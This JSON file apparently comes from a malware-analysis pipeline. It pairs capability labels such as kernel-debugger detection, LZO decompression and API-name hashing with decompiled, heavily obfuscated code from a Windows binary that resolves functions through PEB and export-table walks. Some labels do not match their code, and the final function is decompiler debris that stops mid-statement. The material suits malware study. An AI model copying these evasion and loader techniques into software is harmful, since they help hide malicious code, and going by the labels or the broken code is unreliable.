{
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t __cdecl fcn.00401000(int32_t *arg_8h)\n\n{\n    uint var_bp_ch;\n    \n    // [00] -r-x section size 24576 named .text\n    return *arg_8h << 1;\n}\n",
        "token_count": 73
    },
    "00401091": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00401091(void)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    uint32_t uVar7;\n    uint32_t *puVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t in_FS_OFFSET;\n    char16_t *pcVar11;\n    int32_t iStack200;\n    int32_t iStack196;\n    uint8_t uStack161;\n    uint32_t uStack160;\n    char cStack145;\n    int32_t iStack104;\n    uint uStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uint uStack84;\n    ushort uStack80;\n    uint16_t uStack78;\n    uint32_t uStack76;\n    uint32_t uStack72;\n    int16_t iStack68;\n    int16_t iStack66;\n    uint32_t uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint32_t uStack52;\n    uint32_t uStack48;\n    uint uStack44;\n    uint8_t uStack37;\n    uint uStack36;\n    uint32_t uStack32;\n    uint uStack28;\n    char cStack21;\n    uint var_ch;\n    \n    uVar4 = uStack28;\n    uVar3 = uStack32;\n    uVar2 = uStack52;\n    uStack44 = 0;\n    uStack48 = 0xc332997;\n    uStack56 = CONCAT22(uStack56._2_2_, 0x548b);\n    uStack60 = 0x35e7e48a;\n    uStack28 = 0;\n    uStack32 = 0x6820008;\n    uStack88 = 0x17cde9f7;\n    uStack84 = 0;\n    uStack160 = uStack36 & 0xff000000 | uStack160;\n    uStack36 = uStack36 & 0xffffff | uStack36._3_1_ + 0x6a << 0x18;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    iStack104 = 0;\n    uStack60 = uStack60 ^ 0xffff0000;\n    iVar9 = iStack104;\n    while( true ) {\n        iStack104 = iVar9;\n        pcVar11 = 0xef9f55;\n        (*_sym.imp.GDI32.dll_EndDoc)(0xef9f55);\n        uStack32 = uStack32 & 0xffff;\n        sub.LZ32.dll_LZSeek(iStack200, 0x4c5, iStack196);\n        cStack145 = uVar4 >> 0x18;\n        cStack21 = '}' - cStack145;\n        if (uStack84 % 0x14 == 5) {\n            uStack44 = CONCAT22(0x5e96, uStack44);\n            pcVar11 = 0x435cd6;\n            sub.urlmon.dll_CoInternetGetSecurityUrl();\n            uStack36 = uVar2 * uVar2;\n            uStack32 = (uVar2 * uVar2 >> 0x20) + uVar2 * uVar3 * 2;\n            uStack60 = uStack60 & 0xffff;\n        }\n        iVar9 = uStack48 + (0xfa187853 < uStack52);\n        uStack56 = ~uStack160;\n        uStack60 = uStack60 & 0xffff | uStack60._2_2_ * -0x60c5 << 0x10;\n        iStack196 = 0x222435f - (uStack52 + 0x5e787ac);\n        uVar7 = 0x222435f < uStack52 + 0x5e787ac;\n        uVar10 = -iVar9;\n        iStack200 = uVar10 - uVar7;\n        if (iVar9 == 0 && uVar7 <= uVar10) break;\n        while( true ) {\n            uStack56 = 0x64e3181f;\n            uStack37 = uStack161 + 0x7a;\n            iVar9 = iStack104 + (0x35e7e48b - uStack64);\n            if (iVar9 != 0x244) break;\n            iVar1 = uStack60;\n            uStack60 = uStack60 & 0xffff | uStack60._2_2_ << 0x10 | 0x61c50000;\n            uStack76 = *(*(*(in_FS_OFFSET + (0x35e7e4a2 - uStack64)) + 0x30) + 0xa4);\n            uStack37 = uStack161 * -0x50;\n            uStack80 = 0x9d47;\n            uStack56 = 0xe3eb95f7;\n            if (iVar1 != 0x5013) {\n                if (uStack76 < 6) goto code_r0x00401a08;\n                iVar5 = fcn.0040596a(pcVar11);\n                uStack37 = uStack161 + 0x4b;\n                iVar9 = 0;\n                if (*(iVar5 + *(iVar5 + 0x3c)) == 0x4550) {\n                    iVar9 = iVar5 + *(iVar5 + 0x3c);\n                }\n                uStack78 = *(iVar9 + 0x48);\n                iStack68 = *(iVar9 + 0x4a);\n                uStack56 = 0x56fb6c5f;\n                uStack36 = 0x5e6fcd3c - uVar2;\n                uStack32 = -(0x5e6fcd3c < uVar2) - uVar3;\n                if (uStack78 < 0x5491U - uStack60) goto code_r0x00401a08;\n                uStack37 = uStack161 | 199;\n                iVar9 = fcn.0040581a();\n                if (iVar9 != 0) goto code_r0x00401a08;\n                uStack37 = uStack161 - 0x3c;\n                if (uStack78 != 6 || iStack68 != 0x548b - uStack60) goto code_r0x00401749;\n                goto code_r0x00401a08;\n            }\n        }\n    }\ncode_r0x00401749:\n    iVar9 = fcn.0040581a();\n    if (iVar9 == 0) {\n        uVar7 = uStack64 ^ 0x35e7e48a;\n        uStack56 = uStack160 ^ 0xffffffff;\n        uVar10 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        uStack37 = uStack161 & 0x91;\n        if (uVar10 != uVar7) {\n            uStack37 = uStack161;\n            uStack96 = 0x75b;\n            uStack60 = CONCAT22(0x46d0, uStack60);\n            pcVar11 = L\"WJWEJKME#@WH\";\n            (*_sym.imp.KERNEL32.dll_GetCalendarInfoEx)\n                      (L\"WJWEJKME#@WH\", uStack64 ^ 0x35e7e93e, L\"WJWEJKME#@WH\", 0x35e7eb73 - uStack64, L\"J@#YHW\", 0x7a7\n                       , &uStack96);\n            uStack36 = uVar2 & 0x5b87da98;\n            uStack32 = 0;\n        }\n    }\ncode_r0x00401a08:\n    uStack60 = uStack60 & 0xffff | (uStack60._2_2_ & 0x8ac6) << 0x10;\n    uStack72 = 0x62;\n    if (5 < *(*(*(in_FS_OFFSET + 0x18) + 0x30) + 0xa4)) {\n        iVar9 = fcn.0040596a(pcVar11);\n        puVar6 = iVar9 + *(iVar9 + 0x3c);\n        uStack72 = uStack64 ^ 0x1484c67;\n        if ((uStack52 ^ uStack92 ^ 0x55204492 | uStack48 ^ uStack88) != 0) {\n            puVar8 = NULL;\n            if (*puVar6 == (uStack64 ^ 0x35e7a1da)) {\n                puVar8 = puVar6;\n            }\n            uStack84._2_2_ = *(puVar8 + 0x12);\n            iStack66 = *(puVar8 + 0x4a);\n            uStack72 = 0x62;\n            uStack56 = uStack160 ^ 0x5ae96edc;\n            if (5 < uStack84._2_2_) {\n                uStack60 = CONCAT22(0xcc9b, uStack60);\n                uStack37 = uStack161 + 0x9d;\n                uStack36 = uVar2 * 0x5e580fe1;\n                uStack32 = (uVar2 * 0x5e580fe1 >> 0x20) + uVar3 * 0x5e580fe1;\n                uVar10 = uStack64 ^ 0x35e7e48a;\n                uVar7 = fcn.0040581a();\n                uStack72 = 0x62;\n                if (uVar7 == uVar10) {\n                    uStack56 = ~uStack160;\n                    uStack72 = 0x35e7e4ec - uStack64;\n                    uStack60 = uStack60 & 0xffff | uStack60._2_2_ << 0x10;\n                    if (uStack84._2_2_ != uStack60 + 0xab7bU || iStack66 != 0x548b - uStack60) {\n                        uStack32 = ~uVar3;\n                        uStack36 = ~uVar2;\n                        iVar9 = fcn.0040581a();\n                        uStack72 = uStack64 + 0xca181bd8;\n                        if (iVar9 == 0) {\n                            uStack56 = uStack160 ^ 0xb2aae91;\n                            fcn.004062e0();\n                            uStack72 = 1;\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return uStack72;\n}\n",
        "token_count": 2364
    },
    "004062e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x004063b4)\n// WARNING: Removing unreachable block (ram,0x00406454)\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.004062e0(void)\n\n{\n    uint32_t uVar1;\n    ushort uVar2;\n    code *pcVar3;\n    uchar *arg_8h;\n    uint uVar4;\n    code *pcStack212;\n    uchar auStack204 [44];\n    uint uStack160;\n    int16_t *piStack140;\n    int32_t iStack136;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uchar auStack96 [8];\n    uint uStack88;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t *piStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint32_t uStack44;\n    int32_t iStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_bp_ch;\n    \n    uStack52 = 0;\n    uStack56 = 0x7e681793;\n    uStack60 = 0x33dc9544;\n    uStack76 = 0;\n    uStack80 = 0x592b6687;\n    uVar1 = uStack44 & 0xff000000;\n    uStack36 = CONCAT22(0xe0d2, uStack36);\n    puStack72 = auStack204;\n    uStack28 = 0;\n    uStack32 = 0x10401000;\n    uStack160 = 0x13a00;\n    fcn.004052bc(auStack96);\n    uStack104 = *0x43b404;\n    uStack108 = *0x43b400;\n    uStack112 = *0x43b40c;\n    uStack100 = *0x43b408;\n    uVar2 = uStack36;\n    uStack116 = *0x43b410;\n    pcStack212 = fcn.00405c1b;\n    while( true ) {\n        piStack140 = pcStack212;\n        uStack36 = CONCAT22(0xda9a, uVar2) & 0x95dfffff;\n        if ((*pcStack212 == 0x5a4d) && (piStack68 = *(pcStack212 + 0x3c) + pcStack212,  *piStack68 == 0x4550)) break;\n        pcStack212 = pcStack212 + -0x1000 & 0xfffff000;\n    }\n    iStack64 = piStack68[0x14];\n    uStack44 = uVar1 | uStack44 & 0xffffff;\n    uStack28 = 0;\n    uStack32 = 0x3110f503;\n    iStack40 = iStack40 + 0x5683d42e;\n    arg_8h = auStack204;\n    uVar4 = 0xc9;\n    iStack136 = iStack64;\n    pcVar3 = fcn.00406174(arg_8h, uStack88);\n    uStack36 = CONCAT22(0xc20e, uStack36);\n    (*pcVar3)(arg_8h, uStack88, arg_8h, uVar4);\n    return arg_8h;\n}\n",
        "token_count": 790
    },
    "00401b0d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00401beb)\n\nbool __cdecl fcn.00401b0d(char *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint var_ch;\n    \n    uVar1 = CONCAT11(*arg_8h + -0x23, 0x7f) ^ 0x4c;\n    return uVar1 < uVar1 >> 8;\n}\n",
        "token_count": 108
    },
    "00401c3a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.00401c3a(uint arg_8h, uint arg_ch)\n\n{\n    uint var_5h;\n    \n    return (arg_8h | arg_ch) & 1;\n}\n",
        "token_count": 49
    },
    "00401c59": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00401d1d)\n\nuint __cdecl fcn.00401c59(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint arg_8h_00;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char acStack104 [32];\n    uint uStack72;\n    char cStack65;\n    int32_t iStack64;\n    uint32_t uStack60;\n    code *pcStack56;\n    uint16_t uStack50;\n    char *pcStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uint8_t uStack33;\n    uint32_t uStack32;\n    int32_t iStack28;\n    int16_t iStack24;\n    uint16_t uStack22;\n    uint var_ch;\n    \n    uVar2 = uStack22;\n    iVar1 = iStack28;\n    uVar4 = uStack32;\n    iStack24 = 0x424b;\n    uStack44 = 0x114bf09e;\n    uStack60 = 0x4d0533af;\n    pcStack48 = acStack104;\n    iStack64 = 0;\n    do {\n        uStack50 = 0xa0f3 - iStack24;\n        cStack65 = *(iStack64 + 0x435cc5);\n        uStack32 = uVar4 & 0x2e9c712f;\n        iStack28 = 0;\n        uVar3 = uStack22 & 0x2c0;\n        if (0xf780 < uStack50) goto code_r0x00401e02;\n        iVar5 = uStack44 + 0xeeb40f70;\n        uStack32 = uVar4 * 2;\n        iStack28 = iVar1 * 2 + CARRY4(uVar4, uVar4);\n        acStack104[iStack64] = *(iStack64 + 0x435c8d) - cStack65;\n        iStack64 = iStack64 + 1;\n        uStack40 = uStack40 ^ 0x7ebbafaa;\n    } while (iStack64 != iVar5);\n    uStack33 = uStack33 ^ 0x74;\n    uStack22 = 0x166c;\n    uVar4 = uStack44 ^ 0x5349ee37;\n    arg_8h_00 = fcn.00406740();\n    pcStack56 = fcn.004027c4(arg_8h_00, pcStack48);\n    uStack22 = uVar2 | 0xc3b8;\n    uStack40 = 0x1bbf3c74;\n    uVar3 = uStack22;\n    if (uStack60 != uVar4) {\n        uStack72 = 0;\n        if (0xff < pcStack56) {\n            uStack40 = 0x1bbf3c74;\n            uStack72 = 0;\n            uStack72 = (*pcStack56)(0, arg_ch, 0x1000, arg_8h);\n        }\n        return uStack72;\n    }\ncode_r0x00401e02:\n    uStack22 = uVar3;\n    fcn.00402de1(0x29b5bac);\n    return 0;\n}\n",
        "token_count": 768
    },
    "00402383": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x004025da)\n\nint32_t __cdecl fcn.00402383(int32_t arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint16_t *puStack108;\n    uint32_t uStack88;\n    uint32_t uStack76;\n    uint var_ch;\n    \n    iVar4 = fcn.0040596a();\n    iVar5 = 0;\n    if (*(iVar4 + *(iVar4 + 0x3c)) == 0x4550) {\n        iVar5 = iVar4 + *(iVar4 + 0x3c);\n    }\n    iVar5 = *(iVar5 + 0x78);\n    uVar3 = *(iVar4 + 0x18 + iVar5);\n    if (uVar3 != 0) {\n        puStack108 = iVar4 + *(iVar4 + iVar5 + 0x24);\n        uStack76 = 0;\n        do {\n            uStack88 = 0;\n            do {\n                cVar1 = *(iVar4 + *(iVar4 + *(iVar4 + 0x20 + iVar5) + uStack76 * 4) + uStack88);\n                cVar2 = *(arg_8h + uStack88);\n                if (cVar1 == '\\0') break;\n                uStack88 = uStack88 + 1;\n            } while (uStack88 < 0x20 && (cVar1 == cVar2 && cVar2 != '\\0'));\n            if (cVar1 == cVar2) {\n                return iVar4 + *(iVar4 + *(iVar4 + iVar5 + 0x1c) + *puStack108 * 4);\n            }\n            puStack108 = puStack108 + 1;\n            uStack76 = uStack76 + 1;\n        } while (uStack76 < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 455
    },
    "00402e58": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00402fb8)\n\nint32_t * __cdecl fcn.00402e58(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int16_t iVar3;\n    int32_t in_FS_OFFSET;\n    bool bVar4;\n    uint32_t uStack76;\n    int32_t *piStack60;\n    uint var_ch;\n    \n    iVar1 = *(*(*(in_FS_OFFSET + 0x18) + 0x30) + 0xc);\n    piVar2 = iVar1 + 0x14;\n    piStack60 = *(iVar1 + 0x14);\n    if (piStack60 != piVar2) {\n        do {\n            if (piStack60[4] == arg_ch && arg_ch != NULL) {\n                return piStack60 + -2;\n            }\n            if (*(piStack60 + 9) >> 1 != 0) {\n                uStack76 = 0;\n                do {\n                    iVar3 = *(piStack60[10] + uStack76 * 2);\n                    if (iVar3 - 0x41U < 0x1a) {\n                        iVar3 = iVar3 + 0x20;\n                    }\n                    bVar4 = *(arg_8h + uStack76 * 2) == iVar3;\n                    uStack76 = uStack76 + 1;\n                } while ((bVar4 && iVar3 != 0) && uStack76 < *(piStack60 + 9) >> 1);\n                if (bVar4) {\n                    return piStack60[4];\n                }\n            }\n            piStack60 = *piStack60;\n        } while (piStack60 != piVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 413
    },
    "004038ad": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404682) overlaps instruction at (ram,0x00404680)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00404bb2)\n// WARNING: Removing unreachable block (ram,0x00404bc9)\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nchar * fcn.004038ad(void)\n\n{\n    uchar *puVar1;\n    unkuint3 Var2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    char *pcVar11;\n    char extraout_CL;\n    char extraout_CL_00;\n    char extraout_CL_01;\n    char extraout_CL_02;\n    char extraout_CL_03;\n    char extraout_CL_04;\n    char extraout_CL_05;\n    char extraout_CL_06;\n    char extraout_CL_07;\n    char extraout_CL_08;\n    char extraout_CL_09;\n    char extraout_CL_10;\n    char extraout_CL_11;\n    char extraout_CL_12;\n    char extraout_CL_13;\n    char extraout_CL_14;\n    char extraout_CL_15;\n    char extraout_CL_16;\n    char extraout_CL_17;\n    char extraout_CL_18;\n    char extraout_CL_19;\n    char extraout_CL_20;\n    char extraout_CL_21;\n    char extraout_CL_22;\n    char extraout_CL_23;\n    char extraout_CL_24;\n    char extraout_CL_25;\n    char extraout_CL_26;\n    char extraout_CL_27;\n    char extraout_CL_28;\n    char extraout_CL_29;\n    char extraout_CH;\n    code *pcVar12;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    char *pcVar13;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    unkbyte3 Var16;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    int32_t *piVar14;\n    uint extraout_ECX_08;\n    uchar extraout_CH_00;\n    int32_t extraout_ECX_09;\n    uint extraout_ECX_10;\n    uint extraout_ECX_11;\n    uint extraout_ECX_12;\n    uint extraout_ECX_13;\n    int32_t *piVar15;\n    uint extraout_ECX_14;\n    uint extraout_ECX_15;\n    uint extraout_ECX_16;\n    uint16_t uVar17;\n    int32_t *piVar18;\n    uint32_t uVar19;\n    uint *puVar20;\n    int32_t iVar21;\n    int32_t *piVar22;\n    int32_t *piVar23;\n    uint32_t uVar24;\n    ushort in_CS;\n    ushort uVar25;\n    ushort in_FS;\n    char cVar26;\n    char cVar27;\n    uint8_t in_AF;\n    bool bVar28;\n    uchar uVar29;\n    uchar uStack209;\n    char cStack208;\n    uchar uStack207;\n    uchar uStack206;\n    uchar uStack205;\n    uchar uStack204;\n    ushort auStack203 [4];\n    uint32_t uStack195;\n    uint8_t uStack190;\n    uint8_t uStack189;\n    uint uStack188;\n    uint8_t uStack184;\n    uchar uStack183;\n    uint16_t uStack182;\n    uchar uStack180;\n    uchar uStack179;\n    char cStack178;\n    uchar uStack177;\n    uchar uStack176;\n    uchar uStack175;\n    uchar uStack174;\n    uchar uStack173;\n    uint uStack172;\n    uint uStack168;\n    uchar uStack161;\n    uchar uStack160;\n    ushort uStack159;\n    uchar uStack157;\n    uchar uStack156;\n    ushort uStack155;\n    uchar uStack153;\n    uchar uStack149;\n    uint8_t uStack148;\n    ushort uStack147;\n    uchar uStack145;\n    uchar uStack144;\n    ushort uStack143;\n    uchar uStack141;\n    uchar uStack140;\n    ushort uStack139;\n    uchar uStack137;\n    uint uStack136;\n    uint uStack120;\n    uint uStack116;\n    uint8_t *puStack112;\n    int32_t iStack108;\n    ushort uStack102;\n    int32_t iStack100;\n    uchar uStack89;\n    uint uStack88;\n    uint uStack84;\n    uchar uStack80;\n    int32_t iStack72;\n    uint uStack68;\n    uchar uStack64;\n    ushort uStack63;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack57;\n    uint uStack56;\n    uint uStack52;\n    uchar uStack48;\n    ushort uStack42;\n    int32_t *piStack40;\n    uint uStack36;\n    uchar uStack32;\n    uint8_t uStack30;\n    uint8_t uStack29;\n    uint8_t uStack28;\n    uchar uStack27;\n    uchar uStack26;\n    uchar uStack25;\n    uchar uStack24;\n    uchar uStack23;\n    char cStack22;\n    uchar uStack21;\n    uchar uStack20;\n    uchar uStack19;\n    uint var_ch;\n    \n    uStack42 = 0xafc9;\n    piVar22 = CONCAT11(uStack21, cStack22);\n    uStack52 = 0;\n    uStack56 = 0x5a9d7a65;\n    uStack149 = 0x1f;\n    uVar5 = ~uStack36;\n    uStack156 = uVar5;\n    uStack155 = uVar5 >> 8;\n    uStack153 = uVar5 >> 0x18;\n    uStack57 = 0xcd;\n    Var16 = CONCAT12(uStack26, CONCAT11(uStack27, uStack28));\n    uStack160 = uStack28;\n    uStack159 = Var16 >> 8;\n    uStack157 = uStack25;\n    uStack161 = 0xa6;\n    iVar6 = 0x3e4422fb - CONCAT13(uStack25, Var16);\n    uStack28 = iVar6;\n    uStack27 = iVar6 >> 8;\n    uStack26 = iVar6 >> 0x10;\n    uStack25 = iVar6 >> 0x18;\n    uStack64 = 0xaf;\n    uStack63 = 0xb8ec;\n    uStack61 = 0x39;\n    uStack168 = 0;\n    uStack172 = 0xffffffff;\n    uStack176 = 0x9d;\n    uStack175 = 0x6a;\n    uStack174 = 0x73;\n    uStack173 = 0x36;\n    uStack116 = 0;\n    uStack120 = 0x36736a9d;\n    piVar23 = piVar22 + 0x593e;\n    iStack108 = 0x71f510d4;\n    cStack22 = piVar23;\n    uStack21 = piVar23 >> 8;\n    uStack89 = 0x33;\n    uStack29 = 0x33;\n    uStack137 = 0xd9;\n    uVar5 = 0x1f33;\n    piVar7 = piStack40;\n    piVar18 = uStack36;\ncode_r0x004039ed:\n    uStack189 = uVar5;\n    cVar26 = uVar5 >> 8 < uStack189;\n    cStack178 = piVar22;\n    uStack177 = piVar22 >> 8;\n    uStack184 = piVar18;\n    uStack183 = piVar18 >> 8;\n    uStack182 = piVar18 >> 0x10;\n    uStack188 = piVar7;\n    if (cVar26) {\n        while( true ) {\n            puStack112 = &uStack148;\n            iStack72 = -0x7f3d0519 - uStack56;\n            uStack68 = -(0x80c2fae7 < uStack56) - uStack52;\n            iVar6 = CONCAT13(uStack61, CONCAT21(uStack63, uStack64));\n            uStack88 = 0x6813d430 - uStack56;\n            iVar21 = -(0x6813d430 < uStack56) - uStack52;\n            uStack28 = 0xff;\n            uStack27 = 0xd4;\n            uStack26 = 0xf9;\n            uStack25 = 0x7c;\n            uVar17 = CONCAT11(uStack177, cStack178) & 0x443d;\n            cStack22 = uVar17;\n            uStack21 = uVar17 >> 8;\n            cVar27 = '\\0';\n            uStack29 = uStack189 | 0x11;\n            uStack209 = 0;\n            uStack84 = iVar21;\n            (*_sym.imp.GDI32.dll_FillPath)();\n            cVar26 = cStack208;\n            pcVar11 = iVar6 + -0x39b8ecaf + iVar21 * 4;\n            *pcVar11 = (*pcVar11 - extraout_CL_08) - cVar27;\n            puVar1 = iVar6 + -0x39b8ecab;\n            uVar29 = in_CS;\n            uStack209 = in_CS >> 8;\n            in_CS = 0xfd21;\n            cStack208 = '4';\n            cVar27 = cStack208;\n            cStack208 = cVar26;\n            uVar5 = func_0x04bc038a(uVar29);\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n            piVar18 = uVar5 & 0xffff0000 | uVar17;\n            *piVar18 = *piVar18 << 0x1b;\n            out(*(iVar21 + 4), uVar17);\n            *puVar1 = 0;\n            uVar5 = in(0x9e);\n            uVar3 = uVar5 | 0x48;\n            if (uVar3 < '\\0') break;\n            uVar9 = CONCAT31(extraout_ECX_04 >> 8, 8) & 0x8966443d;\n            *(piVar18 + puVar1) = in_FS;\n            *(uVar5 | 0x48) = *(uVar5 | 0x48) + uVar3;\n            pcVar11 = uVar9 + 0x8a602444;\n            *pcVar11 = *pcVar11 + uVar9;\n        }\n        *(iVar6 + -0x55554391) = *(iVar6 + -0x55554391) + -0x2444899f;\n        uStack207 = &uStack204 >> 8;\n        uStack206 = &uStack204 >> 0x10;\n        uStack205 = &uStack204 >> 0x18;\n        uVar5 = CONCAT13(uStack61, CONCAT21(uStack63, uStack64)) ^ 0x39b8ecaa;\n        uStack28 = 0x3e;\n        uStack27 = 0xfa;\n        uStack26 = 0x77;\n        uStack25 = 0x7f;\n        uStack144 = uVar5;\n        uStack143 = uVar5 >> 8;\n        uStack141 = uVar5 >> 0x18;\n        if ((uVar17 & 1) != puVar1) goto code_r0x0040415f;\n        cVar26 = '\\0';\n        uStack209 = 0;\n        cStack208 = cVar27;\n        (*_sym.imp.USER32.dll_DestroyCaret)();\n        puVar1[uVar5 * 4] = (puVar1[uVar5 * 4] - extraout_CL_02) - cVar26;\n        puVar20 = uVar5 + 4;\n        piVar18 = iVar6 + -0x39b8eca7;\n        do {\n            piVar22 = piVar18;\n            uStack209 = in_CS;\n            cStack208 = in_CS >> 8;\n            in_CS = 0xfd21;\n            uVar5 = func_0x04bc038a();\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n            piVar23 = uVar5 & 0xffff0000 | uVar17;\n            pcVar12 = CONCAT31(extraout_ECX >> 8, 8);\n            *piVar23 = *piVar23 << 0x1b;\n            out(*puVar20, uVar17);\n            *piVar22 = 0;\n            piVar14 = puVar20 + 1 ^ *(puVar20 + 0x4a);\n            uVar5 = in(0x9e);\n            piVar18 = uVar5 | 0x48;\n            if (-1 < (uVar5 | 0x48)) goto code_r0x00403b44;\n            *(piVar22 + -0x1b9c56e6) = *(piVar22 + -0x1b9c56e6) + -0x2444899f;\n            cVar26 = '\\0';\n            uStack209 = 0;\n            (*pcVar12)();\n            *(piVar22 + piVar14) = (*(piVar22 + piVar14) - extraout_CL_03) - cVar26;\n            uVar29 = in_CS;\n            uStack209 = in_CS >> 8;\n            in_CS = 0xfd21;\n            uVar5 = func_0x04bc038a(uVar29);\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n            piVar18 = uVar5 & 0xffff0000 | uVar17;\n            *piVar18 = *piVar18 << 0x1b;\n            out(piVar14[1], uVar17);\n            *(piVar22 + 1) = 0;\n            puVar20 = piVar14 + 2 ^ *(piVar14 + 0x4e);\n            uVar5 = in(0x9e);\n            piVar18 = piVar22 + 1;\n        } while (-1 < (uVar5 | 0x48));\n        *(piVar22 + -0x1b9c56e2) = *(piVar22 + -0x1b9c56e2) + -0x2444899f;\n        piStack40 = ~uStack188;\n        uStack36 = ~CONCAT22(uStack182, CONCAT11(uStack183, uStack184));\n        piVar23 = CONCAT13(uStack61, CONCAT21(uStack63, uStack64));\n        uVar5 = CONCAT31(extraout_ECX_00 >> 8, 8) & (uVar5 | 0x48) & 0xffffff3c;\n        piVar18 = uStack36 & 0xffff0000 | CONCAT11(uStack177, cStack178);\n        cStack22 = cStack178;\n        uStack21 = uStack177;\n        uStack144 = 6;\n        uStack143 = 0;\n        uStack141 = 0;\n        cVar26 = uVar5 < 0x39b8ecafU - piVar23;\n        if (uVar5 != 0x39b8ecafU - piVar23) goto code_r0x0040415f;\n    }\n    uStack209 = 0;\n    (*_sym.imp.KERNEL32.dll_GetStartupInfoW)();\n    *(piVar23 + piVar18) = (*(piVar23 + piVar18) - extraout_CL_12) - cVar26;\n    piVar7 = piVar23 + 1;\n    uVar29 = in_CS;\n    uStack209 = in_CS >> 8;\n    in_CS = 0xfd21;\n    uVar5 = func_0x04bc038a(uVar29);\n    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n    piVar23 = uVar5 & 0xffff0000 | uVar17;\n    *piVar23 = *piVar23 << 0x1b;\n    out(piVar18[1], uVar17);\n    *piVar7 = 0;\n    uVar5 = 